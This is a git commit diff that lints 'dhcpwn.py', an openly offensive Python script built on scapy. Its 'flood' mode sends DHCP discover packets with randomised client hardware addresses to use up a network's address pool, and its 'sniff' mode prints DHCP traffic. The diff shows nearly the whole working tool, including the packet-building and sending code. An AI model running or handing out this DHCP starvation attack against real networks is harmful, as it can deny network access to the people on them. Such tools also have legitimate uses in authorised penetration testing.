5981483c3ee1aadcdabddbe80aecc5dd846b4254
Matt Schwager <schwag09@gmail.com>
2017-05-18 18:09:06 -0400

    Linted Python code and added automatic lint checking

--- dhcpwn.py
+++ dhcpwn.py
@@ -7,60 +7,82 @@ import string
 # Quiet scapy
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-from scapy.all import *
+from scapy import volatile  # noqa: E402
+from scapy import sendrecv  # noqa: E402
+from scapy import config  # noqa: E402
+from scapy.layers import l2  # noqa: E402
+from scapy.layers import inet  # noqa: E402
+from scapy.layers import dhcp  # noqa: E402
+
+# Configuration requires these imports to properly initialize
+from scapy import route  # noqa: E402, F401
+from scapy import route6  # noqa: E402, F401
+
 
 def dhcp_flood(**kwargs):
     iface = kwargs["interface"]
     count = kwargs["count"]
 
     unique_hexdigits = str.encode("".join(set(string.hexdigits.lower())))
-    packet = (Ether(dst="ff:ff:ff:ff:ff:ff")/
-        IP(src="0.0.0.0", dst="255.255.255.255")/
-        UDP(sport=68, dport=67)/
-        BOOTP(chaddr=RandString(12, unique_hexdigits))/
-        DHCP(options=[("message-type", "discover"), "end"])
+    packet = (
+        l2.Ether(dst="ff:ff:ff:ff:ff:ff") /
+        inet.IP(src="0.0.0.0", dst="255.255.255.255") /
+        inet.UDP(sport=68, dport=67) /
+        dhcp.BOOTP(chaddr=volatile.RandString(12, unique_hexdigits)) /
+        dhcp.DHCP(options=[("message-type", "discover"), "end"])
     )
 
-    sendp(
+    sendrecv.sendp(
         packet,
         iface=iface,
         count=count
     )
 
-def print_dhcp_response(response):
-    print("Source: ".format(response[Ether].src))
-    print("Destination: ".format(response[Ether].dst))
 
-    for o in response[DHCP].options:
+def print_dhcp_response(response):
+    print("Source: ".format(response[l2.Ether].src))
+    print("Destination: ".format(response[l2.Ether].dst))
+
+    for o in response[dhcp.DHCP].options:
         if o in ["end", "pad"]:
             break
         print("Option: {}".format(o))
 
+
 def dhcp_sniff(**kwargs):
-    sniff(filter="udp and (port 67 or 68)", prn=print_dhcp_response)
+    sendrecv.sniff(filter="udp and (port 67 or 68)", prn=print_dhcp_response)
+
 
 def parse_args():
-    p = argparse.ArgumentParser(description=
-        '''
+    p = argparse.ArgumentParser(description='''
         All your IPs are belong to us.
         ''', formatter_class=argparse.RawTextHelpFormatter)
 
-    p.add_argument('-i', '--interface', action='store',
-        default=conf.iface,
-        help='network interface to use')
+    p.add_argument(
+        '-i',
+        '--interface',
+        action='store',
+        default=config.conf.iface,
+        help='network interface to use'
+    )
 
     subparsers = p.add_subparsers(dest='command')
     subparsers.required = True
 
     flood = subparsers.add_parser('flood')
-    flood.add_argument('-c', '--count', action='store',
+    flood.add_argument(
+        '-c',
+        '--count',
+        action='store',
         default=10, type=int,
-        help='number of address to consume')
+        help='number of address to consume'
+    )
 
-    sniff = subparsers.add_parser('sniff')
+    subparsers.add_parser('sniff')
 
     args = p.parse_args()
     return args
+
 
 def main():
     args = parse_args()
@@ -71,6 +93,7 @@ def main():
     }
 
     dispatch[args.command](**vars(args))
+
 
 if __name__ == "__main__":
     main()
